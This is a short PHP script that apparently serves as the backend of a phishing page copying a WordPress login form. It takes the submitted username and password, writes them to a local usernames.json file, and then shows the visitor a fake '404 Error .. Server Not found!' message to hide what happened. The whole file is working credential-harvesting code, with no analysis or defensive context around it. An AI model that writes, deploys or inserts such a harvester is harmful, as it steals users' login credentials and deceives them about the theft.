<?php
$user = $_POST['log'];
$pass = $_POST['pwd'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);

$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);


echo("\n404 Error .. Server Not found!");


exit();


